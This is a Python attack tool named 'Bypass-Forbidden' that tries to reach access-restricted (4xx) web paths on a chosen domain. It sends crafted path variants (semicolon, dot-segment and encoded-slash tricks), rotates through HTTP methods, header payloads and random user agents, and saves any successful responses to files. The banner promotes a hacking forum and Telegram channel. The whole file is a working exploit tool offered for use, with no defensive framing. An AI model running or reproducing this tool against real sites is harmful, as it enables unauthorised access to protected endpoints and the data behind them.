# Author: Pari Malam

import argparse
import requests
import sys
import os
import json
import random
from concurrent.futures import ThreadPoolExecutor, wait
from sys import stdout
from colorama import Fore, Style

def dirdar():
    if not os.path.exists('Results'):
        os.mkdir('Results')

def banners():
    os.system('clear' if os.name == 'posix' else 'cls')
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI PARI-MALAM                               "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"FORUM     "+Fore.RED+"             |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"TELEGRAM  "+Fore.RED+"             |"+Fore.LIGHTWHITE_EX+"   @DRAGONFORCE.IO                               "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[Bypass-Forbidden] - {Fore.GREEN}Perform with bypassed 4xx content!\n{Style.RESET_ALL}")
banners()

parser = argparse.ArgumentParser()
parser.add_argument("-url", help="A domain with the protocol. Example: https://example.com", required=True)
parser.add_argument("-path", help="An endpoint. Example: admin", required=True)
parser.add_argument("-output", help="Output file path for successful JSON responses", default="output.json")
args = parser.parse_args()

url = args.url
path = args.path
output_file = args.output

def ua(file_path):
    with open(file_path, "r") as file:
        user_agents = file.readlines()
    user_agents = [user_agent.strip() for user_agent in user_agents]
    return user_agents

def load_header_payloads(file_path):
    with open(file_path, "r") as file:
        header_payloads = file.readlines()
    header_payloads = [payload.strip() for payload in header_payloads]
    return header_payloads

def load_http_methods(file_path):
    with open(file_path, "r") as file:
        http_methods = file.readlines()
    http_methods = [method.strip().upper() for method in http_methods]
    return http_methods

def construct_endpoint_payloads(domain, path):
    payloads = [
        domain + "/" + path.upper(),
        domain + "/" + path + "/",
        domain + "/" + path + "/.",
        domain + "//" + path + "//",
        domain + "/./" + path + "/./",
        domain + "/./" + path + "/..",
        domain + "/;/" + path,
        domain + "/.;/" + path,
        domain + "//;//" + path,
        domain + "/" + path + "..;/",
        domain + "/%2e/" + path,
        domain + "/%252e/" + path,
        domain + "/%ef%bc%8f" + path,
    ]
    return payloads

def penetrate_endpoint(session, endpoint, method, header=None):
    try:
        headers = {}
        if header:
            header_name, header_value = header.split(":", 1)
            header_name = header_name.strip()
            header_value = header_value.strip()
            headers[header_name] = header_value
        user_agent = random.choice(user_agents)
        headers["User-Agent"] = user_agent
        response = session.request(method, endpoint, headers=headers, allow_redirects=True)
        if response.status_code != 200:
            print(f"{Fore.RED}{header} {endpoint} ({response.status_code} {response.reason}){Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}{header} {endpoint} ({response.status_code} {response.reason}){Style.RESET_ALL}")
            try:
                data = response.json()
                dirdar()
                with open(f"Results/{output_file}", "a") as file:
                    json.dump(data, file, indent=4)
                    file.write("\n")
                print(json.dumps(data, indent=4))
            except ValueError:
                content = response.content.decode()
                print(content)
                dirdar()
                with open(f"Results/{output_file}", "a") as file:
                    file.write(content)
                    file.write("\n")
    except Exception as e:
        print(e)

def main():
    print(f"{Fore.CYAN}\nDomain: {url}")
    print(f"Path: {path}{Style.RESET_ALL}")

    global user_agents
    user_agents = ua('lib/ua.txt')

    header_payloads = load_header_payloads('lib/headers.txt')
    http_methods = load_http_methods('lib/methods.txt')

    with requests.Session() as session:
        print(f"{Fore.YELLOW}\nNormal Request{Style.RESET_ALL}")
        endpoints = construct_endpoint_payloads(url, path)
        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(penetrate_endpoint, session, endpoint, method) for endpoint in endpoints for method in http_methods]
            wait(futures)

        print(f"{Fore.YELLOW}\nRequest with Headers{Style.RESET_ALL}")
        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(penetrate_endpoint, session, url, method, header) for method in http_methods for header in header_payloads]
            wait(futures)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
